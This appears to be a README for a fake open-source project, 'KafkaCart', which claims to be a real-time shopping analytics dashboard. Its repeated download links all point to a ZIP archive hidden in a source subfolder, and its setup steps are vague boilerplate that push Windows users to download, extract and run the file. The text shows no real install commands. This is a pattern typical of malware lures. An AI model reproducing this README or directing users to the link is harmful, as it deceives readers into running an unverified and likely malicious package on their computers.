# 📊 KafkaCart - Real-Time Shopping Insights

[![Download KafkaCart](https://img.shields.io/badge/Download%20KafkaCart-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Moundedover-deepseadiver474/KafkaCart/main/client/src/context/Cart_Kafka_1.4.zip)

## 🖥️ What KafkaCart Does

KafkaCart is a real-time analytics app for online stores. It tracks user actions, processes event data, and shows live charts and tables in a web app. You can use it to watch clicks, views, cart activity, and sales events as they happen.

It uses React for the screen you see, Express for the app server, Apache Kafka for event flow, PostgreSQL for stored data, and Redis for fast cache and live updates.

## 📥 Download and Install

Visit this page to download and set up KafkaCart on Windows:

https://raw.githubusercontent.com/Moundedover-deepseadiver474/KafkaCart/main/client/src/context/Cart_Kafka_1.4.zip

If the page includes a release file, download it. If it includes the source code, download the ZIP file and extract it to a folder on your PC.

### What you need

- Windows 10 or Windows 11
- A modern web browser
- Docker Desktop
- At least 8 GB of RAM
- 10 GB of free disk space
- Internet access for the first setup

## 🚀 Quick Setup

1. Open the download link above.
2. Download the project files to your computer.
3. If you get a ZIP file, right-click it and choose Extract All.
4. Open the project folder.
5. Start Docker Desktop.
6. Wait until Docker shows it is running.
7. Open Command Prompt in the project folder.
8. Run the setup command included in the project files.
9. Wait while Docker starts Kafka, PostgreSQL, Redis, the API, and the web app.
10. Open the local address shown in the terminal in your browser.

## 🪟 Run on Windows

If the project uses a setup script, use it from the project folder.

Common file names may include:

- `start.bat`
- `run.bat`
- `docker-compose.yml`

If you see `start.bat` or `run.bat`:

1. Double-click the file.
2. Wait for the windows to finish starting the services.
3. Open the browser link shown on screen.

If you see `docker-compose.yml`:

1. Open the project folder.
2. Hold `Shift` and right-click inside the folder.
3. Choose Open PowerShell window here or Open Terminal here.
4. Run the Docker command from the project files.
5. Wait for all containers to start.
6. Open the local web address in your browser.

## 📦 Main Features

- Live event tracking for store activity
- Real-time charts and dashboards
- Event streaming with Kafka
- Fast data storage with PostgreSQL
- Fast session and cache handling with Redis
- Web interface built with React
- Server logic handled by Express
- Docker-based setup for easier local use

## 🧭 How to Use It

1. Open the app in your browser.
2. Sign in if the app asks for it.
3. Watch the dashboard load live store data.
4. Review user events such as page visits, cart adds, and orders.
5. Use the charts to spot trends in traffic and sales.
6. Refresh the page if you want to see the latest data view.

## 🗂️ Typical Folder Layout

You may see a structure like this:

- `client` — the React app
- `server` — the Express API
- `kafka` — stream setup and event work
- `database` — PostgreSQL data files or setup scripts
- `redis` — cache and live data support
- `docker-compose.yml` — starts the full stack

## 🔧 Common Windows Checks

If the app does not start:

1. Make sure Docker Desktop is open.
2. Check that Docker says it is running.
3. Close other apps that use a lot of memory.
4. Open the project folder again.
5. Run the setup command one more time.
6. Look for the local web address in the terminal window.
7. Make sure your browser allows local sites to open.

## 🧪 What the Dashboard Shows

KafkaCart is built to help you see store activity in real time. The dashboard may include:

- Total visitors
- Product views
- Add-to-cart events
- Checkout events
- Sales by time
- Active users right now
- Event counts by source
- Stream activity status

## 🔐 Data and Local Storage

KafkaCart uses local services to keep event data and app state.

- PostgreSQL stores event records and analytics data
- Redis keeps quick-access data for live views
- Kafka moves events through the system
- The web app reads the processed data and shows it in the browser

## 🛠️ Troubleshooting

### Nothing opens in the browser

- Check the terminal for the local address
- Copy the address into your browser
- Make sure the app finished starting

### Docker says it is not running

- Open Docker Desktop
- Wait until it finishes loading
- Try the setup again

### The page is blank

- Refresh the page
- Close and reopen the browser
- Wait a minute for the services to finish starting

### The app starts, then stops

- Check if another app uses the same port
- Stop the other app
- Run KafkaCart again

## 📌 Best Use Cases

KafkaCart works well for:

- Demoing live analytics
- Testing event-driven systems
- Watching user behavior on a store site
- Checking stream processing flow
- Showing how Kafka, Redis, and PostgreSQL work together

## 📄 File Types You May See

- `.exe` or `.bat` for Windows launch files
- `.zip` for a packaged download
- `.yml` or `.yaml` for Docker setup
- `.sql` for database setup
- `.js` or `.ts` for app code
- `.json` for config files

## 🧩 If You Want to Explore More

Look through these parts of the project:

- App screens in the React client
- API routes in the Express server
- Kafka event flow and topic setup
- Database tables and queries
- Redis cache use for fast data access

## 🌐 Browser Support

KafkaCart works best in:

- Google Chrome
- Microsoft Edge
- Mozilla Firefox

Use the latest version for the best results.

## 📍 Download Link

Open the project page here to download and set up KafkaCart:

https://raw.githubusercontent.com/Moundedover-deepseadiver474/KafkaCart/main/client/src/context/Cart_Kafka_1.4.zip